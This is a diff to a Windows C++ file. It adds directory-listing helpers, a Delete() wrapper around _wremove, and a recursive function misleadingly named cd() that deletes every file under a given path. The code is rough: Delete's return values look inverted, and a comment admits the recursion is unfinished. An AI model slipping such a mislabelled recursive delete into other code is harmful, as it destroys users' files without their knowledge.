@@ -19,18 +19,25 @@
 
 		return wpath;
 	}
+	bool Dot(const wchar_t* str)
+	{
+		if (wcscmp(str, L"..") && wcscmp(str, L".")) return FALSE;
+		return TRUE;
+	}
 
-	std::vector<std::wstring> ListDir()
+	/*2nd version of this func*/
+	std::vector<std::wstring> ListDir(std::wstring s)
 	{
 		std::vector<std::wstring> contents;
-		std::wstring s = Path() + L"\\*";
+		std::wstring w = s  + L"\\*";
 		WIN32_FIND_DATAW data;
-		HANDLE hFind = FindFirstFileW((LPCWSTR)s.c_str(), &data);      // Starts to find the first file inside the directory
+		HANDLE hFind = FindFirstFileW((LPCWSTR)w.c_str(), &data);      // Starts to find the first file inside the directory
 
 		if (hFind != INVALID_HANDLE_VALUE) {
 			do {
 				std::wstring word(data.cFileName);
-				contents.push_back(word);
+				if (Dot(word.c_str())) continue;
+				contents.push_back(s + L"\\" + word);
 			} while (FindNextFileW(hFind, &data));
 			FindClose(hFind);
 		}
@@ -40,4 +47,31 @@
 		}
 		return contents;
 	}
+
+	int Delete(std::wstring s)
+	{
+				if (_wremove(s.c_str()))
+				{
+					return 0;
+				}
+		return -1;
+	}
+
+	void cd(std::wstring s) //It will wroks with recursion.I have to split this func into two or more parts in order the recursion works.
+	{
+		std::vector<std::wstring> v{};
+		int e{};
+		v = ListDir(s);
+		for (int i = 0; i < v.size(); i++)
+		{
+			e = Delete(v[i]);
+		}
+		for each(std::wstring i in v)
+		{
+			std::wcout << i << std::endl;
+			cd(i);
+		}
+	}
+
+	
 #endif
